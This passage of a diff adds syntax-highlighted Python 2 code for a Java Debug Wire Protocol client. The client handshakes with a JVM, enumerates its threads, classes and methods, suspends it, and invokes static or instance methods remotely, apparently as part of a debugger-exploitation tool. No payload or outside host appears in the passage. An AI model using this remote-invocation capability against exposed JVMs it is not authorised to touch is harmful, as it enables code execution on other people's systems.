+        <span class="bp">self</span><span class="o">.</span><span class="n">idsizes</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">getversion</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">allclasses</span><span class="p">()</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">handshake</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="p">)</span>
+        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Failed to connect: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">msg</span><span class="p">)</span>
+
+        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> <span class="n">HANDSHAKE</span> <span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span> <span class="nb">len</span><span class="p">(</span><span class="n">HANDSHAKE</span><span class="p">)</span> <span class="p">)</span> <span class="o">!=</span> <span class="n">HANDSHAKE</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Failed to handshake&quot;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">s</span>
+
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">leave</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">getversion</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">VERSION_SIG</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">),</span> <span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="s2">&quot;jdwpMajor&quot;</span><span class="p">),</span> <span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="s2">&quot;jdwpMinor&quot;</span><span class="p">),</span>
+                    <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;vmVersion&quot;</span><span class="p">),</span> <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;vmName&quot;</span><span class="p">),</span> <span class="p">]</span>
+        <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">,</span> <span class="kc">False</span><span class="p">):</span>
+            <span class="k">for</span> <span class="n">name</span><span class="p">,</span><span class="n">value</span>  <span class="ow">in</span> <span class="n">entry</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
+                <span class="nb">setattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="nd">@property</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">version</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> - </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">vmName</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">vmVersion</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">idsizes</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">IDSIZES_SIG</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;fieldIDSize&quot;</span><span class="p">),</span> <span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;methodIDSize&quot;</span><span class="p">),</span> <span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;objectIDSize&quot;</span><span class="p">),</span>
+                    <span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;referenceTypeIDSize&quot;</span><span class="p">),</span> <span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;frameIDSize&quot;</span><span class="p">)</span> <span class="p">]</span>
+        <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">,</span> <span class="kc">False</span><span class="p">):</span>
+            <span class="k">for</span> <span class="n">name</span><span class="p">,</span><span class="n">value</span>  <span class="ow">in</span> <span class="n">entry</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
+                <span class="nb">setattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">allthreads</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="nb">getattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="s2">&quot;threads&quot;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">ALLTHREADS_SIG</span><span class="p">)</span> <span class="p">)</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+            <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="s2">&quot;threadId&quot;</span><span class="p">)]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">threads</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">)</span>
+        <span class="k">finally</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">threads</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">get_thread_by_name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">allthreads</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">threads</span><span class="p">:</span>
+            <span class="n">threadId</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">t</span><span class="p">[</span><span class="s2">&quot;threadId&quot;</span><span class="p">])</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">THREADNAME_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">threadId</span><span class="p">)</span> <span class="p">)</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="ow">and</span> <span class="n">name</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">readstring</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+                <span class="k">return</span> <span class="n">t</span>
+        <span class="k">return</span> <span class="kc">None</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">get_name_by_threadId</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">threadId</span><span class="p">):</span>
+        <span class="n">threadId</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">threadId</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">THREADNAME_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">threadId</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;name&quot;</span><span class="p">)</span> <span class="p">]</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">allclasses</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="nb">getattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="s2">&quot;classes&quot;</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">ALLCLASSES_SIG</span><span class="p">)</span> <span class="p">)</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+            <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">,</span> <span class="s2">&quot;refTypeTag&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">referenceTypeIDSize</span><span class="p">,</span> <span class="s2">&quot;refTypeId&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;signature&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">)]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">classes</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">classes</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">get_class_by_name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">classes</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">entry</span><span class="p">[</span><span class="s2">&quot;signature&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="p">:</span>
+                <span class="k">return</span> <span class="n">entry</span>
+        <span class="k">return</span> <span class="kc">None</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">get_methods</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">refTypeId</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">methods</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="n">refTypeId</span><span class="p">):</span>
+            <span class="n">refId</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">referenceTypeIDSize</span><span class="p">,</span> <span class="n">refTypeId</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">METHODS_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">refId</span><span class="p">)</span> <span class="p">)</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+            <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">methodIDSize</span><span class="p">,</span> <span class="s2">&quot;methodId&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;name&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;signature&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="s2">&quot;modBits&quot;</span><span class="p">)]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">methods</span><span class="p">[</span><span class="n">refTypeId</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">methods</span><span class="p">[</span><span class="n">refTypeId</span><span class="p">]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">get_method_by_name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">refId</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">methods</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+            <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">methods</span><span class="p">[</span><span class="n">refId</span><span class="p">]:</span>
+                <span class="k">if</span> <span class="n">entry</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="p">:</span>
+                    <span class="k">return</span> <span class="n">entry</span>
+        <span class="k">return</span> <span class="kc">None</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">getfields</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">refTypeId</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span> <span class="n">refTypeId</span> <span class="p">):</span>
+            <span class="n">refId</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">referenceTypeIDSize</span><span class="p">,</span> <span class="n">refTypeId</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">FIELDS_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">refId</span><span class="p">)</span> <span class="p">)</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+            <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">fieldIDSize</span><span class="p">,</span> <span class="s2">&quot;fieldId&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;name&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="s2">&quot;signature&quot;</span><span class="p">),</span>
+                        <span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="s2">&quot;modbits&quot;</span><span class="p">)]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">[</span><span class="n">refTypeId</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">[</span><span class="n">refTypeId</span><span class="p">]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">getvalue</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">refTypeId</span><span class="p">,</span> <span class="n">fieldId</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">referenceTypeIDSize</span><span class="p">,</span> <span class="n">refTypeId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">fieldIDSize</span><span class="p">,</span> <span class="n">fieldId</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">GETVALUES_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="s2">&quot;Z&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">)</span> <span class="p">]</span>
+        <span class="n">field</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">return</span> <span class="n">field</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">createstring</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">buildstring</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">CREATESTRING_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">buf</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">[(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="s2">&quot;objId&quot;</span><span class="p">)],</span> <span class="kc">False</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">buildstring</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="n">data</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">readstring</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">4</span><span class="o">+</span><span class="n">size</span><span class="p">]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">suspendvm</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span> <span class="n">SUSPENDVM_SIG</span> <span class="p">)</span> <span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">resumevm</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span> <span class="n">RESUMEVM_SIG</span> <span class="p">)</span> <span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">invokestatic</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">classId</span><span class="p">,</span> <span class="n">threadId</span><span class="p">,</span> <span class="n">methId</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">referenceTypeIDSize</span><span class="p">,</span> <span class="n">classId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">threadId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">methodIDSize</span><span class="p">,</span> <span class="n">methId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">))</span>
+        <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">args</span><span class="p">:</span>
+            <span class="n">data</span><span class="o">+=</span> <span class="n">arg</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">INVOKESTATICMETHOD_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">buf</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">objId</span><span class="p">,</span> <span class="n">threadId</span><span class="p">,</span> <span class="n">classId</span><span class="p">,</span> <span class="n">methId</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">objId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">threadId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">referenceTypeIDSize</span><span class="p">,</span> <span class="n">classId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">methodIDSize</span><span class="p">,</span> <span class="n">methId</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">))</span>
+        <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">args</span><span class="p">:</span>
+            <span class="n">data</span><span class="o">+=</span> <span class="n">arg</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">INVOKEMETHOD_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">buf</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">solve_string</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">objId</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">STRINGVALUE_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">objId</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
